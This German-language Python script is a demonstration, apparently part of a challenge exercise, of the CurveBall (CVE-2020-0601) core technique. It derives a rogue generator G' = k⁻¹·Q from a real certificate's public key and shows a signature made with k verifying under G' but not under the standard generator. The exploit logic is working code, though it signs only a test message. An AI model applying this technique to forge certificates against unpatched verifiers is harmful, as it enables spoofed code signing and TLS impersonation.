#!/usr/bin/env python3
"""
curveball_demo.py – Interaktive Demonstration der CurveBall-Kernformel

Verwendung:
    python3 curveball_demo.py <zertifikat.crt> <k_wert>

    <zertifikat.crt>  PEM-Datei mit einem EC-Zertifikat (z.B. comodo-intermediate.crt)
    <k_wert>          Ganzzahl; 0 = automatisch zufaellig waehlen

Beispiel (Schritt 3 der Challenge):
    python3 curveball_demo.py comodo-intermediate.crt 0

Was das Skript zeigt:
    1. Oeffentlichen Punkt Q aus dem Zertifikat lesen
    2. k waehlen (zufaellig oder vorgegeben)
    3. G' = k^{-1} * Q berechnen
    4. Signatur mit k und G' erzeugen und verifizieren  →  "gueltig mit G'"
    5. Dieselbe Signatur mit Standard-G verifizieren    →  "ungueltig mit G"
"""

import sys
import os
import secrets

import ecdsa.curves
import ecdsa.ellipticcurve
import ecdsa.numbertheory
import ecdsa.keys
import ecdsa.util
from asn1crypto import core, keys, pem, x509

# ─────────────────────────────────────────────────────────────────────────────
# Kurvendaten fuer P-256 und P-384 (NIST-Standardgeneratoren)
# ─────────────────────────────────────────────────────────────────────────────

KNOWN_CURVES = {
    "prime256v1": ecdsa.curves.NIST256p,
    "secp256r1":  ecdsa.curves.NIST256p,
    "P-256":      ecdsa.curves.NIST256p,
    "secp384r1":  ecdsa.curves.NIST384p,
    "P-384":      ecdsa.curves.NIST384p,
}


def load_ec_certificate(path: str) -> x509.Certificate:
    """Laedt ein einzelnes PEM-Zertifikat (oder das erste aus einer Kette)."""
    with open(path, "rb") as f:
        data = f.read()

    # Versuche als einzelnes DER-Zertifikat
    try:
        return x509.Certificate.load(data)
    except Exception:
        pass

    # PEM-Kette: erstes Zertifikat nehmen, das EC-Parameter hat
    for obj_type, _, der_bytes in pem.unarmor(data, multiple=True):
        if obj_type != "CERTIFICATE":
            continue
        cert = x509.Certificate.load(der_bytes)
        algo = cert["tbs_certificate"]["subject_public_key_info"]["algorithm"]
        if algo["algorithm"].native == "ec":
            params = algo["parameters"]
            chosen = params.chosen
            # Wir brauchen einen named-curve OID oder explizite Parameter
            if hasattr(chosen, "native") or isinstance(chosen, keys.SpecifiedECDomain):
                return cert

    raise ValueError(f"Kein EC-Zertifikat in {path!r} gefunden.")


def get_nist_curve_and_Q(cert: x509.Certificate):
    """Gibt (ecdsa.Curve, Qx, Qy, curve_name) zurueck."""
    algo = cert["tbs_certificate"]["subject_public_key_info"]["algorithm"]
    if algo["algorithm"].native != "ec":
        raise ValueError("Zertifikat enthaelt keinen EC-Schluessel.")

    params = algo["parameters"]
    chosen = params.chosen

    # Named Curve (OID)
    if hasattr(chosen, "native") and not isinstance(chosen, keys.SpecifiedECDomain):
        curve_name = chosen.native
        nist = KNOWN_CURVES.get(curve_name)
        if nist is None:
            raise ValueError(f"Unbekannte Kurve: {curve_name}")
    # Explizite Parameter – Kurve ueber Feldparameter identifizieren
    elif isinstance(chosen, keys.SpecifiedECDomain):
        p     = chosen["field_id"]["parameters"].native
        a     = chosen["curve"]["a"].cast(core.IntegerOctetString).native
        order = chosen["order"].native
        nist  = None
        curve_name = "unbekannt"
        for name, candidate in KNOWN_CURVES.items():
            if (candidate.curve.p() == p
                    and candidate.curve.a() == a
                    and candidate.order == order):
                nist = candidate
                curve_name = name
                break
        if nist is None:
            raise ValueError("Explizite Parameter passen zu keiner bekannten NIST-Kurve.")
    else:
        raise ValueError("Unbekanntes Parameterformat.")

    Qx, Qy = cert["tbs_certificate"]["subject_public_key_info"]["public_key"].to_coords()
    return nist, Qx, Qy, curve_name


def demo(cert_path: str, k_input: int) -> None:
    # ── Zertifikat laden ────────────────────────────────────────────────────
    print()
    print("═" * 62)
    print("  CurveBall Demo  –  Kernformel G' = k⁻¹ · Q")
    print("═" * 62)

    cert = load_ec_certificate(cert_path)
    subject = cert["tbs_certificate"]["subject"].human_friendly
    print(f"\n  Zertifikat : {subject[:55]}")

    nist, Qx, Qy, curve_name = get_nist_curve_and_Q(cert)
    print(f"  Kurve      : {curve_name}")
    print(f"  Pub-Key Q  : ({hex(Qx)[:14]}…, {hex(Qy)[:14]}…)")

    # ── k waehlen ──────────────────────────────────────────────────────────
    n = nist.order
    if k_input == 0:
        k = secrets.randbelow(n - 1) + 1
        print(f"\n  k (zufällig gewählt)")
    else:
        k = k_input % n
        print(f"\n  k (vorgegeben)")
    print(f"  k          : {hex(k)[:18]}…")

    # ── G' berechnen ───────────────────────────────────────────────────────
    print("\n  Berechne G' = k⁻¹ · Q …")
    k_inv   = ecdsa.numbertheory.inverse_mod(k, n)
    Q_point = ecdsa.ellipticcurve.Point(nist.curve, Qx, Qy, n)
    G_prime = Q_point * k_inv

    Gx, Gy  = G_prime.x(), G_prime.y()
    print(f"  G'         : ({hex(Gx)[:14]}…, {hex(Gy)[:14]}…)")

    # ── Sanity-Check ───────────────────────────────────────────────────────
    lhs = ecdsa.ellipticcurve.Point(nist.curve, Gx, Gy, n) * k
    assert lhs.x() == Qx and lhs.y() == Qy, "INTERNER FEHLER: k * G' ≠ Q"
    print(f"  ✓ Prüfung k · G' = Q bestanden")

    # ── Manipulierte Kurve erzeugen ────────────────────────────────────────
    exploit_curvefp = nist.curve                           # Feldparameter gleich
    exploit_gen     = ecdsa.ellipticcurve.Point(exploit_curvefp, Gx, Gy, n)
    exploit_curve   = ecdsa.curves.Curve(None, exploit_curvefp, exploit_gen, (0, 0))

    # ── Test-Nachricht signieren ────────────────────────────────────────────
    message   = b"CurveBall CVE-2020-0601 Demo"
    import hashlib
    digest    = hashlib.sha256(message).digest()

    signing_key = ecdsa.keys.SigningKey.from_secret_exponent(k, curve=exploit_curve)
    signature   = signing_key.sign_digest(digest, sigencode=ecdsa.util.sigencode_der)

    # ── Verifikation 1: mit G' (muss gueltig sein) ─────────────────────────
    print()
    print("  ─── Signaturprüfung ───────────────────────────────────────")

    Q_point_ecdsa = ecdsa.ellipticcurve.Point(exploit_curvefp, Qx, Qy, n)
    vk_exploit = ecdsa.keys.VerifyingKey.from_public_point(
        Q_point_ecdsa, curve=exploit_curve, hashfunc=None
    )
    try:
        vk_exploit.verify_digest(signature, digest, sigdecode=ecdsa.util.sigdecode_der)
        result1 = "✓  gültig mit G'   ← Angriff würde funktionieren"
    except Exception as e:
        result1 = f"✗  FEHLER: {e}"

    # ── Verifikation 2: mit Standard-G (muss ungueltig sein) ───────────────
    std_gen     = nist.generator
    std_curvefp = nist.curve
    std_curve   = ecdsa.curves.Curve(None, std_curvefp, std_gen, (0, 0))
    Q_point_std = ecdsa.ellipticcurve.Point(std_curvefp, Qx, Qy, n)
    vk_std = ecdsa.keys.VerifyingKey.from_public_point(
        Q_point_std, curve=std_curve, hashfunc=None
    )
    try:
        vk_std.verify_digest(signature, digest, sigdecode=ecdsa.util.sigdecode_der)
        result2 = "✓  gültig mit G    (unerwartet – sollte nicht passieren)"
    except Exception:
        result2 = "✗  ungültig mit G  ← gepatchter Verifier würde ablehnen"

    print(f"  {result1}")
    print(f"  {result2}")
    print()
    print("  Erklärung:")
    print("  Der Angreifer kennt k, hat aber NICHT den privaten Schlüssel der CA.")
    print("  Er wählt G' so, dass k · G' = Q gilt — damit ist k ein gültiger")
    print("  privater Schlüssel relativ zu G'. Ein Verifier, der G' aus dem")
    print("  Zertifikat übernimmt (Pre-Patch), sieht eine gültige Signatur.")
    print("  Ein Verifier, der G gegen den NIST-Standard prüft (Post-Patch),")
    print("  erkennt die Abweichung und lehnt das Zertifikat ab.")
    print()
    print("═" * 62)
    print()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Verwendung: {sys.argv[0]} <zertifikat.crt> <k_wert>")
        print(f"  k_wert = 0  →  zufälliges k")
        sys.exit(1)

    cert_path = sys.argv[1]
    try:
        k_input = int(sys.argv[2])
    except ValueError:
        print("Fehler: k_wert muss eine Ganzzahl sein (0 = zufällig).")
        sys.exit(1)

    if not os.path.isfile(cert_path):
        print(f"Fehler: Datei {cert_path!r} nicht gefunden.")
        sys.exit(1)

    demo(cert_path, k_input)
